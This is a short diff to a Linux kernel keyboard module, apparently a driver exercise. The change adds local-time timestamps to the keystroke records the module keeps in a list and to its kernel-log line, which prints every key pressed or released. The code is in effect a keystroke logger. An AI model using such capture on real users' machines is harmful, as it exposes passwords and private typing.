@@ -44,7 +44,9 @@ void	scan_fsm_clear(struct fsm *scan_fsm)
 void	scan_fsm_send(struct fsm *scan_fsm, void *target)
 {
 	struct timeval		tv;
+	struct rtc_time		tm;
 	struct keystroke	*ks;
+	unsigned long		local_time;
 
 	if ((ks = kmalloc(sizeof(struct keystroke), GFP_KERNEL))) {
 		ks->key = scan_fsm->key;
@@ -53,8 +55,11 @@ void	scan_fsm_send(struct fsm *scan_fsm, void *target)
 		strcpy(ks->name, scan_fsm->name);
 		ks->ascii = (unsigned int)ks->key;	
 		do_gettimeofday(&tv);
-		ks->tv = tv;
-		printk(KERN_INFO "key %c state %s name %s\n", ks->key, (ks->state == 0) ? "PRESSED" :
+		local_time = (u32)(tv.tv_sec - (sys_tz.tz_minuteswest * 60));
+		rtc_time_to_tm(local_time, &tm);
+		ks->tm = tm;
+		printk(KERN_INFO "[%04d-%02d-%02d %02d:%02d:%02d] key %c state %s name %s\n", tm.tm_year + 1900, tm.tm_mon + 1,
+			tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ks->key, (ks->state == 0) ? "PRESSED" :
 			"RELEASED", ks->name);
 		INIT_LIST_HEAD(&ks->list);
 		list_add_tail(&ks->list, target);
